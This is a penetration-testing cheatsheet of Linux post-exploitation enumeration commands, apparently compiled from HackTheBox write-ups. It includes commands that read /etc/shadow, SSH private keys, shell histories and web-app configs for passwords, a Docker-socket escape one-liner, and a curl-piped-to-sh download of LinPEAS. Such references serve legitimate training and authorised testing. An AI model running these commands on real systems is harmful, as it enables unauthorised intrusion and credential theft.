---
title: "Linux Post-Exploitation Enumeration Cheatsheet"
type: cheatsheet
tags: [cheatsheet, enumeration, htb, linux, post-exploitation, privilege-escalation]
date_created: 2026-05-12
date_updated: 2026-05-12
sources: [git-htb-writeups]
---

# Linux Post-Exploitation Enumeration Cheatsheet

---

## System Information

```bash
uname -a                  # kernel version + arch
cat /etc/os-release       # distro name and version
cat /etc/issue
hostnamectl
arch; uname -m
cat /proc/version
```

---

## Users and Groups

```bash
id; whoami; groups
cat /etc/passwd
cat /etc/passwd | grep -v nologin | grep -v false   # real login accounts
cat /etc/group
cat /etc/shadow                                      # if readable
w; who; last                                         # logged-in users
sudo -l                                              # sudo permissions
```

---

## Network

```bash
ip a; ifconfig
ip route; route -n
ss -tulnp; netstat -tulnp               # listening ports
arp -a; ip neigh                        # ARP table
cat /etc/resolv.conf; cat /etc/hosts
iptables -L -n -v                       # firewall rules
```

---

## Processes and Services

```bash
ps aux; ps -ef
ps auxf; pstree                         # process tree
systemctl list-units --type=service --state=running
service --status-all
crontab -l
ls -la /etc/cron*; cat /etc/crontab
ls -la /var/spool/cron/crontabs/
systemctl list-timers                   # systemd timers
```

---

## SUID / SGID / Capabilities

```bash
# SUID binaries (check GTFOBins for each)
find / -perm -4000 -type f 2>/dev/null

# SGID binaries
find / -perm -2000 -type f 2>/dev/null

# Both SUID+SGID
find / -perm -6000 -type f 2>/dev/null

# Capabilities
getcap -r / 2>/dev/null

# Writable files
find / -writable -type f 2>/dev/null | grep -v proc
```

---

## File System — Interesting Files

```bash
# Config and credential files
find / -name "*.conf" -type f 2>/dev/null
find / -name "*.config" -type f 2>/dev/null
find / -name "*.db" -o -name "*.sqlite" -type f 2>/dev/null
find / -name "*.bak" -o -name "*.old" -type f 2>/dev/null
find / -name ".env" -type f 2>/dev/null
find / -name "id_rsa" -type f 2>/dev/null
find / -name "*.key" -o -name "*.pem" -type f 2>/dev/null

# Recently modified files
find / -mmin -10 -type f 2>/dev/null

# Writable directories
find / -writable -type d 2>/dev/null

# Mounted filesystems
mount; df -h; cat /etc/fstab
```

---

## Interesting Locations

```bash
# Home directories
ls -la /home/; ls -la /root/

# SSH keys
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa

# History files
cat ~/.bash_history
cat ~/.zsh_history
cat ~/.mysql_history
cat ~/.psql_history

# Web app configs (common credential sources)
cat /etc/apache2/sites-enabled/*
cat /etc/nginx/sites-enabled/*
grep -ri "password" /var/www/ 2>/dev/null
grep -ri "DB_PASS" /var/www/ 2>/dev/null

# WordPress / Joomla / CMS database creds
cat /var/www/html/wp-config.php
cat /var/www/html/configuration.php
```

---

## Docker / Container Check

```bash
# Am I in a container?
cat /proc/1/cgroup | grep -i docker
ls -la /.dockerenv
hostname

# Docker socket (escape if available)
ls -la /var/run/docker.sock
docker images; docker ps -a
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
```

---

## Internal Services

```bash
# Services only listening on localhost (potential pivot targets)
ss -tulnp | grep 127.0.0.1
netstat -tulnp | grep 127

# Port-forward to attacker for access
ssh -L 8080:127.0.0.1:8080 user@10.10.10.X
```

---

## Automated Tools

```bash
# LinPEAS — most comprehensive
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# LinEnum
./LinEnum.sh -t

# linux-exploit-suggester — kernel CVE suggestions
./linux-exploit-suggester.sh

# pspy — monitor processes without root (catch cron jobs, SUID invocations)
./pspy64
```

---

## Quick Enumeration Order

```bash
id                                         # who am I
sudo -l                                    # sudo rights → check GTFOBins
find / -perm -4000 -type f 2>/dev/null     # SUID
getcap -r / 2>/dev/null                    # capabilities
cat /etc/crontab; ls -la /etc/cron.*       # cron jobs
./pspy64                                   # monitor running processes
find / -writable -type f 2>/dev/null | grep -v proc  # writable files
cat ~/.bash_history                        # command history with creds
find / -name "id_rsa" 2>/dev/null          # SSH keys
grep -ri "password" /var/www/ 2>/dev/null  # web app creds
uname -r                                   # kernel for exploit search
```

## See Also

- [[linux-privesc]] — exploitation of all above vectors
- [[linux-privesc]] cheatsheet — attack commands
- [[docker-attacks]] — container escape techniques
